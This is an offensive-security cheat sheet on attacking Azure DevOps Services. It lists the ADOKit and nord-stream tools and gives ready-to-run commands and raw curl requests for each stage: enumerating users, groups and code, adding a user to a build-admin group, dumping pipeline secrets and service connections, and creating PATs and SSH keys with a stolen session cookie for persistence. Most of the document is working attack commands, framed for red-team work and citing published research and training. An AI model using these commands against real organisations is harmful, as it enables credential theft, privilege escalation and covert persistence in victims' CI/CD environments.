# Azure Services - Azure DevOps

* [xforcered/ADOKit](https://github.com/xforcered/ADOKit) - Azure DevOps Services Attack Toolkit
* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) - Nord Stream is a tool that allows you to extract secrets stored inside CI/CD environments by deploying malicious pipelines. It currently supports Azure DevOps, GitHub and GitLab.
    ```ps1
    # List all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

    # Dump all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg
    ```

## Authentication

You can access an organization's Azure DevOps Services instance via https://dev.azure.com/{yourorganization}. 

* Username and Password
* Authentication Cookie `UserAuthentication`: `ADOKit.exe whoami /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization`
* Personal Access Token (PAT): `ADOKit.exe whoami /credential:patToken /url:https://dev.azure.com/YourOrganization`
    ```ps1
    PAT="XXXXXXXXXXX"
    organization="YOURORGANIZATION"
    curl -u :${PAT} https://dev.azure.com/${organization}/_apis/build-release/builds
    ```


## Recon

* Search files: `file:FileNameToSearch`, `file:Test* OR file:azure-pipelines*`
  ```ps1
  curl -i -s -k -X $'GET'
  -H $'Content-Type: application/json'
  -H $'User-Agent: SOME_USER_AGENT'
  -H $'Authorization: Basic BASE64ENCODEDPAT'
  -H $'Host: dev.azure.com'
  $'https://dev.azure.com/YOURORGANIZATION/PROJECTNAME/_apis/git/repositories/REPOSITORYID/items?recursionLevel=Full&api-version=7.0'
  ```

* Search code: `ADOKit.exe searchcode /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /search:"search term"`
  ```ps1
  curl -i -s -k -X $'POST'
  -H $'Content-Type: application/json'
  -H $'User-Agent: SOME_USER_AGENT'
  -H $'Authorization: Basic BASE64ENCODEDPAT'
  -H $'Host: almsearch.dev.azure.com'
  -H $'Content-Length: 85'
  -H $'Expect: 100-continue'
  -H $'Connection: close'
  --data-binary $'{\"searchText\": \"SEARCHTERM\", \"skipResults\":0,\"takeResults\":1000,\"isInstantSearch\":true}' 
  $'https://almsearch.dev.azure.com/YOURORGANIZATION/_apis/search/codeAdvancedQueryResults?api-version=7.0-preview'
  ```

* Enumerate users
  ```ps1
  curl -i -s -k -X $'GET'
  -H $'Content-Type: application/json'
  -H $'User-Agent: SOME_USER_AGENT'
  -H $'Authorization: Basic BASE64ENCODEDPAT'
  -H $'Host: dev.azure.com'
  $'https://dev.azure.com/YOURORGANIZATION/_apis/graph/users?api-version=7.0'
  ```

* Enumerate groups: `ADOKit.exe getgroupmembers /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /group:"search term"`
  ```ps1
  curl -i -s -k -X $'GET'
  -H $'Content-Type: application/json'
  -H $'User-Agent: SOME_USER_AGENT'
  -H $'Authorization: Basic BASE64ENCODEDPAT'
  -H $'Host: dev.azure.com'
  $'https://dev.azure.com/YOURORGANIZATION/_apis/graph/groups?api-version=7.0'
  ```

* Enumerate project permissions: `ADOKit.exe getpermissions /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"project name"`


## Privilege Escalation

* Adding User to Group: `ADOKit.exe addcollectionbuildadmin /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /user:"username"` 
    ```ps1
    curl -i -s -k -X $'PUT'
    -H $'Content-Type: application/json'
    -H $'User-Agent: Some User Agent'
    -H $'Authorization: Basic base64EncodedPAT'
    -H $'Host: vssps.dev.azure.com'
    -H $'Content-Length: 0'
    $'https://vssps.dev.azure.com/YourOrganization/_apis/graph/memberships/userDescriptor/groupDescriptor?api-version=7.0-preview.1'
    ```

* Retrieve build variables and secrets: `ADOKit.exe getpipelinevars /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"project name"`, `ADOKit.exe getpipelinesecrets /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"project name"`
    ```ps1
    curl -i -s -k -X $'GET'
    -H $'Content-Type: application/json'
    -H $'User-Agent: Some User Agent'
    -H $'Authorization: Basic base64EncodedPAT'
    -H $'Host: dev.azure.com'
    $'https://dev.azure.com/YourOrganization/ProjectName/_apis/build/Definitions/DefinitionIDNumber?api-version=7.0'
    ```

* Retrieve Service Connection Information: `ADOKit.exe getserviceconnections /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"project name"`
    ```ps1
    curl -i -s -k -X $'GET'
    -H $'Content-Type: application/json;api-version=5.0-preview.1'
    -H $'User-Agent: Some User Agent'
    -H $'Authorization: Basic base64EncodedPAT'
    -H $'Host: dev.azure.com'
    $'https://dev.azure.com/YourOrganization/YourProject/_apis/serviceendpoint/endpoints?api-version=7.0'
    ```


## Persistence

* Create a PAT: `ADOKit.exe createpat /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization`
    ```ps1
    curl -i -s -k -X $'POST'
    -H $'Content-Type: application/json'
    -H $'Accept: application/json;api-version=5.0-preview.1'
    -H $'User-Agent: Some User Agent'
    -H $'Host: dev.azure.com'
    -H $'Content-Length: 234'
    -H $'Expect: 100-continue'
    -b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'
    --data-binary $'{\"contributionIds\":[\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\"],\"dataProviderContext\":{\"properties\":{\"displayName\":\"PATName\",\"validTo\":\"YYYY-MMDDT00:00:00.000Z\",\"scope\":\"app_token\",\"targetAccounts\":[]}}}}}'
    $'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'
    ```

* Create SSH Keys: `ADOKit.exe createsshkey /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /sshkey:"ssh pub key"`
    ```ps1
    curl -i -s -k -X $'POST'
    -H $'Content-Type: application/json'
    -H $'Accept: application/json;api-version=5.0-preview.1'
    -H $'User-Agent: Some User Agent'
    -H $'Host: dev.azure.com'
    -H $'Content-Length: 856'
    -H $'Expect: 100-continue'
    -b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'
    --data-binary $'{\"contributionIds\":[\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\"],\"dataProviderContext\":{\"properties\":{\"displayName\":\"SSHKeyName\",\"publicData\":\"public SSH key content\",\"validTo\":\"YYYY-MMDDT00:00:00.000Z\",\"scope\":\"app_token\",\"isPublic\":true,\"targetAccounts\":[\"organizationID\"]}}}}}'
    $'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'
    ```


## References

* [Hiding in the Clouds: Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules - Brett Hawkins - November 6, 2023](https://www.ibm.com/downloads/cas/5JKAPVYD)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)